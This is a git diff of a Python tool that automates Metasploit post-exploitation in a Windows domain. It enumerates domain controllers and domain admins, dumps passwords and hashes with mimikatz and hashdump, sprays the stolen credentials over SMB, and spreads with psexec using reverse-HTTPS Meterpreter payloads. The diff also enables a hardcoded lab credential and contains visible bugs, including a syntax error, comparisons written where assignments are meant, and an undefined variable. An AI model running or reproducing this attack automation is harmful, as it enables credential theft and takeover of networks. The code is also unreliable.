@@ -74,6 +74,10 @@ def debug_info(output, label, label_num):
         else:
             print_debug('Output == None', label, label_num)
 
+def end_script():
+    kill_tasks()
+    raise asyncio.CancelledError
+
 def kill_tasks():
     print()
     print_info('Killing tasks then exiting', None, None)
@@ -123,8 +127,11 @@ async def run_sysinfo(client, sess_num, sess_data):
 
     cmd = 'sysinfo'
     end_strs = [b'Meterpreter     : ']
+    api_call = 'run_single'
 
+    await make_session_busy(sess_num, sess_data)
     output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
+    make_session_not_busy(sess_num, sess_data)
 
     if err:
         print_bad('Session appears to be broken', 'Session', sess_num)
@@ -139,7 +146,9 @@ async def run_getuid(client, sess_num, sess_data):
     cmd = 'getuid'
     end_strs = [b'Server username:']
 
+    await make_session_busy(sess_num, sess_data)
     output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
+    make_session_not_busy(sess_num, sess_data)
    
     if err:
         print_bad('Session appears to be dead', 'Session', sess_num)
@@ -164,32 +173,19 @@ async def get_shell_info(client, sess_num, sess_data):
 
     return shell_info
 
-def get_domain(shell_info):
-    for l in shell_info:
-
-        l = l.decode('utf8')
-
-        l_split = l.split(':')
-        if 'Domain      ' in l_split[0]:
-            if 'WORKGROUP' in l_split[1]:
-                return b'no domain'
-            else:
-                domain = l_split[-1].strip()
-                return domain.encode()
-
-def is_domain_joined(user_info, domain):
-    if user_info != b'ERROR':
-        info_split = user_info.split(b':')
-        dom_and_user = info_split[1].strip()
-        dom_and_user_split = dom_and_user.split(b'\\')
-        dom = dom_and_user_split[0].lower()
-        user = dom_and_user_split[1]
-
-        if domain != b'no domain':
-            if dom.lower() in domain.lower():
-                return b'True'
-
-    return b'False'
+#def is_domain_joined(user_info, domain):
+#    if user_info != b'ERROR':
+#        info_split = user_info.split(b':')
+#        dom_and_user = info_split[1].strip()
+#        dom_and_user_split = dom_and_user.split(b'\\')
+#        dom = dom_and_user_split[0].lower()
+#        user = dom_and_user_split[1]
+#
+#        if domain != b'no domain':
+#            if dom.lower() in domain.lower():
+#                return b'True'
+#
+#    return b'False'
 
 def print_shell_data(shell_info, admin_shell, local_admin, sess_num_str):
     print_info('Meterpreter shell info', 'Session', int(sess_num_str))
@@ -208,12 +204,17 @@ def print_shell_data(shell_info, admin_shell, local_admin, sess_num_str):
 #    await asyncio.sleep(secs)
 #    sess_data[sess_num][b'busy'] = b'False'
 
-async def sess_first_check(client, sess_num, sess_data, domain_data):
-    # Give it time to open
-    await asyncio.sleep(2)
+async def sess_first_check(lock, client, sess_num, sess_data, domain_data):
 
     if b'first_check' not in sess_data[sess_num]:
+
         sess_num_str = str(sess_num)
+        print_good('New session {} found'.format(sess_num_str), 'Session', sess_num)
+
+        # Give it time to open
+        print_info('Waiting 5 seconds for the session to completely open', 'Session', sess_num)
+        await asyncio.sleep(5)
+
         sess_data[sess_num][b'busy'] = b'False'
         sess_data[sess_num][b'first_check'] = b'False'
         sess_data[sess_num][b'errors'] = []
@@ -221,7 +222,6 @@ async def sess_first_check(client, sess_num, sess_data, domain_data):
         ip = sess_data[sess_num][b'tunnel_peer'].split(b':')[0]
         ip_data = b'IP              : '+ip
 
-        print_good('New session {} found'.format(str(sess_num)), 'Session', sess_num)
 
         # Migrate out of the process
         # Not sure we want this as it'll migrate a domain user with local admin shell into SYSTEM
@@ -235,16 +235,44 @@ async def sess_first_check(client, sess_num, sess_data, domain_data):
         # Get shell privileges
         admin_shell, local_admin = await check_privs(client, sess_num, sess_data)
 
-        # Get domain info
+        # Get session domain from shell info
         domain = get_domain(shell_info)
         sess_data[sess_num][b'domain'] = domain
         sess_data[sess_num][b'domain_joined'] = is_domain_joined(shell_info[1], domain)
 
         # Update domain_data for domain admins and domain controllers
-        await get_DCs_DAs(client, sess_num, sess_data, domain_data)
+        await make_session_busy(sess_num, sess_data)
+        await start_shell(client, sess_num, sess_data)
+
+        domains_and_DCs = await get_domains_and_DCs(lock, client, sess_num, sess_data)
+        domain_data['domains'].update(domains_and_DCs)
+        for dom in domains_and_DCs:
+            print_info('Domain and controllers: {}'.format(dom), 'Session', sess_num)
+            for DC in domains_and_DCs[dom]:
+                print('                            '+DC)
+        DAs = await get_domain_admins(lock, client, sess_num, sess_data, domain_data)
+        for da in DAs:
+            print_info('Domain admin: '+da, 'Session', sess_num)
+        domain_data['domain_admins'] = DAs
+
+        await end_shell(lock, client, sess_num, sess_data)
+        make_session_not_busy(sess_num, sess_data)
+
+        # Check if it's a shell on a DC
+        all_DCs = await combine_DCs(lock, domain_data)
+        if ip.decode('utf8') in all_DCs and admin_shell == b'True':
+            print_great('Admin shell on domain controller acquired!', 'Session', sess_num)
+#            end_script()
 
         # Print the new shell's data
         print_shell_data(shell_info, admin_shell, local_admin, sess_num_str)
+
+async def combine_DCs(lock, domain_data):
+    all_DCs = []
+    with await lock:
+        for d in domain_data['domains']:
+            all_DCs += [x for x in domain_data['domains'][d]]
+    return all_DCs
 
 def parse_pid(output, user, proc):
     for l in output.splitlines():
@@ -323,7 +351,9 @@ async def check_privs(client, sess_num, sess_data):
     cmd = 'run post/windows/gather/win_privs'
     end_strs = [b'==================']
 
+    await make_session_busy(sess_num, sess_data)
     output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
+    make_session_not_busy(sess_num, sess_data)
     if err:
         admin_shell = b'ERROR'
         local_admin = b'ERROR'
@@ -348,75 +378,166 @@ async def check_privs(client, sess_num, sess_data):
 
     return (admin_shell, local_admin)
 
-async def get_domain_controllers(client, sess_num, sess_data, domain_data):
-    print_info('Getting domain controller', 'Session', sess_num)
-    cmd = 'run post/windows/gather/enum_domains'
-    end_strs = [b'[+] Domain Controller:']
+async def exec_process(*cmd):
+    p = await asyncio.create_subprocess_exec(*cmd,
+                                             stdin=asyncio.subprocess.PIPE,
+                                             stdout=asyncio.subprocess.PIPE,
+                                             stderr=asyncio.subprocess.PIPE)
+    stdout, stderr = await p.communicate()
+    if stdout:
+        stdout = stdout.decode('utf8')
+    if stderr:
+        stderr = stderr.decode('utf8')
+    return (stdout, stderr)
 
-    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
-    if err:
-        return
-
-    output = output.decode('utf8')
-    if 'Domain Controller: ' in output:
-        dc = output.split('Domain Controller: ')[-1].strip()
-        if dc not in domain_data['domain_controllers']:
-            domain_data['domain_controllers'].append(dc)
-            print_info('Domain controller: '+dc, 'Session', sess_num)
-
-async def get_domain_admins(client, sess_num, sess_data, domain_data, ran_once):
-    print_info('Getting domain admins', 'Session', sess_num)
-    cmd = 'run post/windows/gather/enum_domain_group_users GROUP="Domain Admins"'
-    end_strs = [b'[+] User list']
-
-    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
-    if err:
-        return
-
-    output = output.decode('utf8')
-    da_line_start = '[*] \t'
-
-    if da_line_start in output:
-        split_output = output.splitlines()
-
-        domain_admins = []
-        for l in split_output:
-            if l.startswith(da_line_start):
-                domain_admin = l.split(da_line_start)[-1].strip()
-                if len(domain_admin) > 0:
-                    # lowercase the domain
-                    dom = domain_admin.split('\\')[0].lower()
-                    user = domain_admin.split('\\')[1]
-                    domain_admin = dom+'\\'+user
-                    domain_admins.append(domain_admin)
-
-        for x in domain_admins:
-            if x not in domain_data['domain_admins']:
-                print_info('Domain admin: '+x, 'Session', sess_num)
-                domain_data['domain_admins'].append(x)
-
-    # If we don't get any DAs from the shell we try one more time
+async def host_to_ip(sess_num, host):
+    stdout, stderr = await exec_process('host', host)
+    if stderr:
+        print_bad('Error converting host to IP: {}'.format(stderr), 'Session', sess_num)
     else:
-        if ran_once:
-            print_bad('No domain admins found', 'Session', sess_num)
-        else:
-            print_bad('No domain admins found, trying one more time', 'Session', sess_num)
-            ran_once = True
-            await get_domain_admins(client, sess_num, sess_data, domain_data, ran_once)
+        for l in stdout.splitlines():
+            l = l.strip()
+            if ' has address ' in l:
+                ip = l.split()[-1]
+                return ip
 
-async def get_DCs_DAs(client, sess_num, sess_data, domain_data):
-    # Update domain data
-    if b'domain' in sess_data[sess_num]:
-        domain_data['domain'] = sess_data[sess_num][b'domain'].decode('utf8').lower()
+async def start_shell(client, sess_num, sess_data):
+    ''' start OS cmd prompt on a meterpreter session '''
+    cmd = 'shell'
+    end_strs = [b'\\system32>']
+    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
 
-    if len(domain_data['domain_admins']) == 0:
-        run_once = False
-        await get_domain_admins(client, sess_num, sess_data, domain_data, run_once)
-    if len(domain_data['domain_controllers']) == 0:
-        await get_domain_controllers(client, sess_num, sess_data, domain_data)
+async def end_shell(lock, client, sess_num, sess_data):
+    ''' ends OS cmd prompt on a meterpreter session '''
+    cmd = 'exit'
+    end_strs = [b'exit']
+    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs, api_call='write')
+
+async def get_domains_and_DCs(lock, client, sess_num, sess_data):
+    print_info('Getting domain controller', 'Session', sess_num)
+
+    # Subshells must have newline
+    cmd = 'wmic NTDOMAIN GET DomainControllerAddress,DomainName /VALUE\n'
+    end_strs = [b'\\system32>']
+
+    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs, api_call='write')
+    if err:
+        return
+
+    output = output.decode('utf8')
+
+    domains_and_DCs = parse_domain_wmic(output)
+
+    return domains_and_DCs
+
+def parse_domain_wmic(output):
+    ''' 
+    Example output:
+
+    DomainControllerAddress=
+    DomainName=
+    Roles=
+
+
+    DomainControllerAddress=\\192.168.243.129
+    DomainName=LAB2
+    Roles=
+    '''
+    DC_str = 'DomainControllerAddress=\\\\'
+    domain_str = 'DomainName='
+    domains_and_DCs = {}
+    DC = None
+
+    # remove empty lines from output
+    output = os.linesep.join([s for s in output.splitlines() if s])
+
+    for l in output.splitlines():
+        l = l.strip()
+
+        if DC:
+            if domain_str in l:
+                domain = l.split(domain_str)[1].lower()
+                if domain in domains_and_DCs:
+                    domains_and_DCs[domain] = [DC]
+                else:
+                    domains_and_DCs[domain].append(DC)
+
+            DC = None
+
+        elif DC_str in l:
+            DC = l.split(DC_str)[1]
+
+    return domains_and_DCs
+
+def is_domain_joined(user_info, domain):
+    if user_info != b'ERROR':
+        info_split = user_info.split(b':')
+        dom_and_user = info_split[1].strip()
+        dom_and_user_split = dom_and_user.split(b'\\')
+        dom = dom_and_user_split[0].lower()
+        user = dom_and_user_split[1]
+
+        if domain != b'no domain':
+            if dom.lower() in domain.lower():
+                return b'True'
+
+    return b'False'
+
+def get_domain(shell_info):
+    for l in shell_info:
+
+        l = l.decode('utf8')
+
+        l_split = l.split(':')
+        if 'Domain      ' in l_split[0]:
+            if 'WORKGROUP' in l_split[1]:
+                return b'no domain'
+            else:
+                domain = l_split[-1].strip()
+                return domain.encode()
+
+async def get_domain_admins(lock, client, sess_num, sess_data, domain_data):
+    ''' Session is dropped into a cmd prompt prior to this function running '''
+    print_info('Getting domain admins', 'Session', sess_num)
+    end_strs = [b'\\system32>']
+
+    domain_admins = []
+    domains = []
+
+    with await lock:
+        for domain in domain_data['domains']:
+            domains.append(domain)
+
+    for domain in domains:
+        # Subshells must have newlines in their commands
+        cmd = 'wmic path win32_groupuser where (groupcomponent="win32_group.name=\"domain admins\",domain=\"{}\"")\n'.format(domain)
+        output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs, api_call='write')
+        if err:
+            continue
+        DAs = parse_wmic_DA_out(output)
+        domain_admins += DAs
+
+    return domain_admins
+
+async def parse_wmic_DA_out(output):
+    ''' example line:
+    win32_group.domain="lab2",name="domain admins"  \\WIN10-2\root\cimv2:Win32_UserAccount.Domain="lab2",Name="Administrator"
+    '''
+    DAs = []
+    output = output.decode('utf8')
+    for l in output.splitlines():
+        if 'Win32_UserAccount.Domain' in l:
+            l_split = l.split()
+            # \\WIN10-2\root\cimv2:Win32_UserAccount.Domain="lab2",Name="Administrator"
+            part_component = l_split[1]
+            match = re.search('Name="(.*)"',part_component)
+            if match:
+                dom_user = domain+'\\'+match.group(1)
+                DAs.append(dom_user)
+
+    return DAs
 
 def update_session(msf_sess, msf_sess_num, sess_data):
-
     if msf_sess_num in sess_data:
         # Update session with the new key:value's in sess_data
         # This will not change any of the MSF session data, just add new key:value pairs
@@ -452,21 +573,31 @@ def update_session(msf_sess, msf_sess_num, sess_data):
 #    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
 #    return (output, err)
 
-async def load_met_plugin(client, sess_num, sess_data, plugin):
+async def load_met_plugin(lock, client, sess_num, sess_data, plugin):
+    while sess_data[sess_num][b'busy'] == b'True':
+        await asyncio.sleep(1)
     cmd = 'load '+plugin
     end_strs = [b'Success.', b'has already been loaded.']
+
+    await make_session_busy(sess_num, sess_data)
     output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
+    make_session_not_busy(sess_num, sess_data)
+
     return (output, err)
 
-async def run_mimikatz(client, sess_num, sess_data, domain_data):
+async def run_mimikatz(lock, client, sess_num, sess_data, domain_data):
     plugin = 'mimikatz'
-    output, err = await load_met_plugin(client, sess_num, sess_data, plugin)
+    output, err = await load_met_plugin(lock, client, sess_num, sess_data, plugin)
     if err:
         return
 
     cmd = 'wdigest'
     end_strs = [b'    Password']
+
+    await make_session_busy(sess_num, sess_data)
     output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
+    make_session_not_busy(sess_num, sess_data)
+
     if err:
         return
 
@@ -503,73 +634,101 @@ async def run_mimikatz(client, sess_num, sess_data, domain_data):
                         domain_data['creds'].append(creds)
                         msg = 'Creds found through Mimikatz: '+creds
                         print_great(msg, 'Session', sess_num)
-                        await check_for_DA(creds)
+                        await check_for_DA(lock, client, creds, sess_num, domain_data)
 
-async def check_creds_against_DC(client, sess_num, creds, plaintext):
-    cred_split = creds.split(':')
-    user = cred_split[0]
-    pw = cred_split[1]
-    pass
-########### finish this eventually
+async def check_creds_against_DC(lock, client, sess_num, cred_data, domain_data):
+    domain_data_key = 'domain_controllers'
+    if domain_data_key in domain_data:
 
-async def check_for_DA(lock, creds):
-    pass
+        dom_data_copy = domain_data.copy()
+        print_info('Checking [{}:{}] against domain controllers'.format(cred_data[1], cred_data[2]), 'Session', sess_num)
+        c_ids = [x[b'id'] for x in client.call('console.list')[b'consoles']]
+        c_id = await get_nonbusy_cid(client, c_ids)
 
-#    da_creds = False
-#    dom_user = creds.split(':', 1)[0]
-#
-#    # Got a hash
-#    if creds.count(':') > 5 and creds.endswith(':::'):
-#        hash_split = creds.split(':')
-#        user = hash_split[0]
-#        rid = hash_split[1]
-#        lm = hash_split[2]
-#        ntlm = hash_split[3]
-#        with await lock:
-#            for c in domain_data['domain_admins']:
-#                da_user_pw = c.split('\\')[1]
-#                da_user = da_user_pw.split(':')[0]
-#                creds = da_user+':'+ntlm
-#                if user.lower() == da_user.lower():
-#                    msg = 'Potential domain admin found! '+creds
-#                    print_good(msg, 'Session', sess_num)
-#                    da_creds = True
-#                    plaintext = False
-#
-#    # plaintext
-#    else:
-#        username_pw = creds.split('\\')[1]
-#        username = username_pw.split(':')[0]
-#        with lock:
-#            DAs = [da for da in domain_data['domain_admin']]
-#
-#        # Got NTLM or plaintext DA creds
-#        if dom_user in DAs:
-#            print_great('Domain admin found! - '+dom_user, None, None)
-#            kill_tasks()
-#            sys.exit()
-#
-#        if username in DAs:
-#            print_great('Potential domain admin found! '+creds, None, None)
-#            print_info('Known domain admins:', None, None)
-#            for da in DAs:
-#                print('    '+da)
-#
-#    if da_creds:
-#        if len(domain_data['domain_controllers']) > 0:
-#            creds_worked = await check_creds_against_DC(client, sess_num, creds, plaintext)
-#            if creds_worked:
-#                print_great('Confirmed domain admin! '+creds, 'Session', sess_num)
+        filename = 'DCs'
+        target_ips = create_hostsfile(dom_data_copy, filename, domain_data_key)
+        threads = '1'
+        dom = cred_data[0]
+        user = cred_data[1]
+        pwd = cred_data[2]
+        lhost = get_local_ip(get_iface())
 
-async def get_passwords(client, sess_num, sess_data, domain_data):
-    await run_mimikatz(client, sess_num, sess_data, domain_data)
-    await run_hashdump(client, sess_num, sess_data, domain_data)
+        cmd, output, err = await run_smb_login(client, c_id, lhost, threads, user, pwd, dom, target_ips)
+        await parse_smb_login(lock, c_id, output, domain_data)
+
+async def make_session_busy(sess_num, sess_data):
+    while sess_data[sess_num][b'busy'] == b'True':
+        await asyncio.sleep(1)
+    sess_data[sess_num][b'busy'] == b'True'
+
+def make_session_not_busy(sess_num, sess_data):
+    sess_data[sess_num][b'busy'] == b'False'
+
+async def check_for_DA(lock, client, creds, sess_num, domain_data):
+
+    dom_user = creds.split(':', 1)[0]
+    DAs = []
+    cred_data = None
+
+    # Get a copy of domain_data['domain_admins']
+    with await lock:
+        for x in domain_data['domains']:
+            DAs.append(x)
+
+    # Got a hash
+    if creds.count(':') > 5 and creds.endswith(':::'):
+        hash_split = creds.split(':')
+        user = hash_split[0]
+        rid = hash_split[1]
+        lm = hash_split[2]
+        ntlm = hash_split[3]
+
+        # In case there's a DA like LAB\Administrator we don't want to trigger
+        # on all RID 500 Admin usernames
+        if user.lower() == 'administrator':
+            return
+
+        for c in DAs:
+            da_user = c.split('\\')[1]
+            if user.lower() == da_user.lower():
+                dom = '.'
+                lm_ntlm = lm+':'+ntlm
+                cred_data = (dom, user, lm_ntlm)
+                break
+
+    # plaintext
+    else:
+        split_creds = creds.split(':', 1)
+        dom_user = split_creds[0]
+        pwd = split_creds[1]
+        dom_user_split = dom_user.split('\\', 1)
+        dom = dom_user_split[0]
+        user = dom_user_split[1]
+        for c in DAs:
+            if dom_user.lower() == c.lower():
+                cred_data = (dom, user, pwd)
+                break
+
+    if cred_data:
+        msg = 'Potential domain admin found! '+creds
+        print_good(msg, 'Session', sess_num)
+        if len(domain_data['domain_controllers']) > 0:
+            # This will run smb_login and parse_smb_login will tell us if its DA
+            await check_creds_against_DC(lock, client, sess_num, cred_data, domain_data)
+
+async def get_passwords(lock, client, sess_num, sess_data, domain_data):
+    await run_mimikatz(lock, client, sess_num, sess_data, domain_data)
+    await run_hashdump(lock, client, sess_num, sess_data, domain_data)
     #mimikittenz
 
-async def run_hashdump(client, sess_num, sess_data, domain_data):
+async def run_hashdump(lock, client, sess_num, sess_data, domain_data):
     cmd = 'hashdump'
     end_strs = None
+
+    await make_session_busy(sess_num, sess_data)
     output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
+    make_session_not_busy(sess_num, sess_data)
+
     if err:
         return
 
@@ -579,6 +738,7 @@ async def run_hashdump(client, sess_num, sess_data, domain_data):
             domain_data['creds'].append(l)
             msg = 'Hashdump creds - '+l
             print_great(msg, 'Session', sess_num)
+            await check_for_DA(lock, client, l, sess_num, domain_data)
 
 def get_console_ids(client):
     c_ids = [x[b'id'] for x in client.call('console.list')[b'consoles']]
@@ -598,9 +758,9 @@ async def run_msf_module(client, c_id, mod, rhost_var, target_ips, lhost, extra_
 
     payload = 'windows/x64/meterpreter/reverse_https'
     cmd = create_msf_cmd(mod, rhost_var, target_ips, lhost, payload, extra_opts, start_cmd)
-    mod_out = await run_console_cmd(client, c_id, cmd, end_strs)
+    mod_out, err = await run_console_cmd(client, c_id, cmd, end_strs)
 
-    return (cmd, mod_out)
+    return (cmd, mod_out, err)
 
 def create_msf_cmd(module_path, rhost_var, target_ips, lhost, payload, extra_opts, start_cmd):
     cmds = ('use {}\n'
@@ -616,17 +776,18 @@ async def run_console_cmd(client, c_id, cmd, end_strs):
     '''
     Runs module and gets output
     '''
+    err = None
     cmd_split = cmd.splitlines()
     module = cmd_split[0].split()[1]
     print_info('Running MSF module [{}]'.format(module), 'Console', c_id)
     client.call('console.write',[c_id, cmd])
+
     output = await get_console_output(client, c_id, end_strs)
     err = get_output_errors(output, cmd)
     if err:
         print_bad(err, 'Console', c_id)
-        return
 
-    return output
+    return (output, err)
 
 async def get_console_output(client, c_id, end_strs, timeout=240):
     '''
@@ -656,6 +817,8 @@ async def get_console_output(client, c_id, end_strs, timeout=240):
         output += client.call('console.read', [c_id])[b'data']
 
         if end_strs:
+            if type(end_strs) == tuple:
+
             if any(end_strs in output for end_strs in end_strs):
                 break
 
@@ -701,9 +864,10 @@ def parse_creds(creds, cred_type):
         user = cred_split[0]
         # Remove domain from user
         if "\\" in user:
-            user = user.split("\\")[1]
+            user_split = user.split("\\")
+            user = user_split[1]
+            dom = user_split[0]
         pwd = cred_split[1]
-        dom = domain_data['domain'].lower()
         rid = None
 
     return dom, user, pwd, rid
@@ -724,28 +888,42 @@ async def spread(lock, client, c_ids, lhost, sess_data, domain_data):
 
         await asyncio.sleep(1)
 
+async def run_smb_login(client, c_id, lhost, threads, user, pwd, dom, target_ips):
+    mod = 'auxiliary/scanner/smb/smb_login'
+    rhost_var = 'RHOSTS'
+    start_cmd = 'run'
+    extra_opts = ('set threads {}\n'
+                  'set smbuser {}\n'
+                  'set smbpass {}\n'
+                  'set smbdomain {}'.format(threads, user, pwd, dom))
+    end_strs = [b'Auxiliary module execution completed']
+
+
+    if 'file:' in target_ips:
+        print_info('Spraying credentials [{}:{}] against hosts'.format(user, pwd), 'Console', c_id)
+    else:
+        print_info('Trying credentials [{}:{}] against {}'.format(user, pwd, target_ips), 'Console', c_id)
+
+    cmd, output, err = await run_msf_module(client, c_id, mod, rhost_var, target_ips, lhost, extra_opts, start_cmd, end_strs)
+    return (cmd, output, err)
+
 async def run_smb_brute(lock, client, c_ids, lhost, creds, sess_data, domain_data, dom_data_copy):
     cred_type = plaintext_or_hash(creds)
     dom, user, pwd, rid = parse_creds(creds, cred_type)
+    threads = '32'
 
     # Just smb brute with rid 500 for now
     if cred_type == 'hash' and rid != '500':
         return
 
-    mod = 'auxiliary/scanner/smb/smb_login'
-    rhost_var = 'RHOSTS'
-    start_cmd = 'run'
-    target_ips = create_hostsfile(creds, dom_data_copy)
-    extra_opts = ('set threads 32\n'
-                  'set smbuser {}\n'
-                  'set smbpass {}\n'
-                  'set smbdomain {}'.format(user, pwd, dom))
-    end_strs = [b'Auxiliary module execution completed']
-
+    filename = 'unchecked_hosts'
+    domain_data_key = 'hosts'
+    target_ips = create_hostsfile(dom_data_copy, filename, domain_data_key)
     c_id = await get_nonbusy_cid(client, c_ids)
-    print_info('Spraying credentials [{}:{}] against hosts'.format(user, pwd), 'Console', c_id)
-    cmd, output = await run_msf_module(client, c_id, mod, rhost_var, target_ips, lhost, extra_opts, start_cmd, end_strs)
-    await parse_module_output(lock, c_id, cmd, output, domain_data)
+
+    cmd, output, err = await run_smb_login(client, c_id, lhost, threads, user, pwd, dom, target_ips)
+
+    await parse_module_output(lock, c_id, err, cmd, output, domain_data)
 
 async def get_admin_session_data(lock, sess_data, domain_data):
 
@@ -823,34 +1001,45 @@ async def run_psexec_psh(lock, client, c_id, creds, ip, lhost, domain_data):
 
     domain_data['pending_shell_ips'].append(ip)
     print_info('Performing lateral movement with credentials [{}:{}] against host [{}]'.format(user, pwd, ip), 'Console', c_id)
-    cmd, output = await run_msf_module(client, c_id, mod, rhost_var, ip, lhost, extra_opts, start_cmd, end_strs)
-    await parse_module_output(lock, c_id, cmd, output, domain_data)
+    cmd, output, err = await run_msf_module(client, c_id, mod, rhost_var, ip, lhost, extra_opts, start_cmd, end_strs)
+    await parse_module_output(lock, c_id, err, cmd, output, domain_data)
 
-async def parse_module_output(lock, c_id, cmd, output, domain_data):
+async def parse_module_output(lock, c_id, err, cmd, output, domain_data):
     if 'smb_login' in cmd:
         await parse_smb_login(lock, c_id, output, domain_data)
     elif 'psexec_psh' in cmd:
-        await parse_psexec_psh(c_id, cmd, output, domain_data)
+        await parse_psexec_psh(lock, c_id, err, cmd, output, domain_data)
 
-async def parse_psexec_psh(c_id, cmd, output, domain_data):
+async def remove_pending_ip(lock, ip, domain_data):
+    with await lock:
+        if ip in domain_data['pending_shell_ips']:
+            domain_data['pending_shell_ips'].remove(ip)
+
+async def parse_psexec_psh(lock, c_id, err, cmd, output, domain_data):
     user = None
+
+    for l in cmd.splitlines():
+        if 'RHOST' in l:
+            ip = l.split()[-1]
 
     # If run_psexec_psh fails then remove the IP from pending_shell_ips
     if not output:
-        for l in cmd.splitlines():
-            if 'RHOST' in l:
-                ip = l.split()[-1]
-                if ip in domain_data['pending_shell_ips']:
-                    domain_data['pending_shell_ips'].remove(ip)
+        await remove_pending_ip(lock, ip, domain_data)
 
-    for l in output.splitlines():
-        l = l.strip().decode('utf8')
-        if 'smbuser =>' in l:
-            user = l.split()[-1]
-        if '[*] Meterpreter session ' in l:
-            l_split = l.split()
-            ip = l_split[7][:-1].split(':')[0]
-            print_good('Successfully opened new shell with admin [{}] on [{}]'.format(user, ip), 'Console', c_id)
+    elif err:
+        await remove_pending_ip(lock, ip, domain_data)
+
+    else:
+        for l in output.splitlines():
+            l = l.strip().decode('utf8')
+            if 'smbuser =>' in l:
+                user = l.split()[-1]
+            elif '[*] Meterpreter session ' in l:
+                l_split = l.split()
+                ip = l_split[7][:-1].split(':')[0]
+                print_good('Successfully opened new shell with admin [{}] on [{}]'.format(user, ip), 'Console', c_id)
+            elif 'no session was created' in l:
+                await remove_pending_ip(lock, ip, domain_data)
 
 async def create_user_pwd_creds(lock, user, pwd, dom, domain_data):
     '''Parse out the username and domain
@@ -910,6 +1099,11 @@ async def parse_smb_login(lock, c_id, output, domain_data):
             admin_str = "' Administrator"
             if l.endswith(admin_str):
 
+                if ip in domain_data['domain_controllers']:
+                    print_great('Admin credentials found against [{}] domain controller! [{}]'.format(ip, user_pwd),
+                                None, None)
+#                    end_script()
+
                 # IP will only be in there if the creds are admin on the box
                 if ip in domain_data['checked_creds'][creds]:
                     continue
@@ -927,22 +1121,22 @@ async def parse_smb_login(lock, c_id, output, domain_data):
         else:
             print_bad('Failed to parse smb_login output', 'Console', c_id)
 
-def create_hostsfile(c, dom_data_copy):
+def create_hostsfile(dom_data_copy, filename, domain_data_key):
 
     identifier = ''.join(random.choice(string.ascii_letters) for x in range(7))
-    filename = 'unchecked_hosts-{}.txt'.format(identifier)
-    with open(filename, 'w') as f:
-        for ip in dom_data_copy['hosts']:
+    fname = '{}-{}.txt'.format(filename, identifier)
+    with open(fname, 'w') as f:
+        for ip in dom_data_copy[domain_data_key]:
             f.write(ip+'\n')
 
-    return 'file:'+os.getcwd()+'/'+filename
+    return 'file:'+os.getcwd()+'/'+fname
 
-async def attack(client, sess_num, sess_data, domain_data):
+async def attack(lock, client, sess_num, sess_data, domain_data):
 
     # Is admin
     if sess_data[sess_num][b'admin_shell'] == b'True':
         # mimikatz, spray, PTH RID 500
-        await get_passwords(client, sess_num, sess_data, domain_data)
+        await get_passwords(lock, client, sess_num, sess_data, domain_data)
 
     # Not admin
     elif sess_data[sess_num][b'admin_shell'] == b'False':
@@ -1000,6 +1194,7 @@ def get_output_errors(output, cmd):
                      b'failed to load extension',
                      b'requesterror',
                      b'is not a valid option for this module',
+                     b'is not recognized as an',
                      b'exploit failed: rex::']
     err = None
 
@@ -1010,25 +1205,24 @@ def get_output_errors(output, cmd):
 #        if len(out_splitline) > 1:
 #            output = out_splitline[0]
 
-        err = 'Command [{}] failed with error: {}'.format(cmd, output.decode('utf8').strip())
+        err = 'Command [{}] failed with error: {}'.format(cmd.splitlines()[0], output.decode('utf8').strip())
 
     return err
 
-async def run_session_cmd(client, sess_num, sess_data, cmd, end_strs, timeout=240):
+async def run_session_cmd(client, sess_num, sess_data, cmd, end_strs, api_call='run_single', timeout=240):
 
     err = None
     output = None
     error_msg = 'Error in session {}: {}'
     sess_num_str = str(sess_num)
 
-    print_info('Running [{}]'.format(cmd), 'Session', sess_num)
-
-    while sess_data[sess_num][b'busy'] == b'True':
-        await asyncio.sleep(1)
+    print_info('Running [{}]'.format(cmd.strip()), 'Session', sess_num)
 
     sess_data[sess_num][b'busy'] = b'True'
+    if 'wmic' in cmd:
+        embed()
 
-    res = client.call('session.meterpreter_run_single', [str(sess_num), cmd])
+    res = client.call('session.meterpreter_{}'.format(api_call), [str(sess_num), cmd])
 
     # Error from MSF API
     if b'error_message' in res:
@@ -1153,9 +1347,9 @@ async def get_sessions(lock, client, domain_data, sess_data):
 
     ### exists for potential debug purposes ##
     counter = 0
-    #if counter > 30:
+    if counter > 30:
     #    # Yes this is public information but just here for debugging
-    #    domain_data['creds'].append('lab2\\dan.da:Qwerty1da')
+        domain_data['creds'].append('lab2\\dan.da:Qwerty1da')
     ##########################################
 
     while True:
@@ -1169,8 +1363,7 @@ async def get_sessions(lock, client, domain_data, sess_data):
                 print_waiting = False
 
                 # Attack!
-                asyncio.ensure_future(attack_with_session(
-                                                          lock,
+                asyncio.ensure_future(attack_with_session(lock,
                                                           client,
                                                           msf_sess_num,
                                                           sess_data,
@@ -1237,21 +1430,21 @@ def parse_hostlist(domain_data):
 
 async def attack_with_session(lock, client, sess_num, sess_data, domain_data):
 
-    task = await sess_first_check(client, sess_num, sess_data, domain_data)
+    task = await sess_first_check(lock, client, sess_num, sess_data, domain_data)
     if task:
         await asyncio.wait(task)
 
     if is_session_broken(lock, sess_num, sess_data) == False:
-        await attack(client, sess_num, sess_data, domain_data)
+        await attack(lock, client, sess_num, sess_data, domain_data)
 
 def main():
 
     lock = asyncio.Lock()
     client = msfrpc.Msfrpc({})
     sess_data = {}
-    domain_data = {'domain':None,
+    # domain_data = {'domain':[domain_admins]}
+    domain_data = {'domains':{},
                    'domain_admins':[],
-                   'domain_controllers':[],
                    'high_priority_ips':[],
                    'pending_shell_ips':[],
                    'creds':[],
@@ -1288,7 +1481,6 @@ def main():
                                               domain_data))
 
     try:
-#        loop.run_until_complete(fut_check_sessions, fut_attack, fut_spread)
         loop.run_until_complete(asyncio.gather(fut_get_sessions, fut_spread))
     except asyncio.CancelledError:
         print_info('Tasks gracefully smited.', None, None)
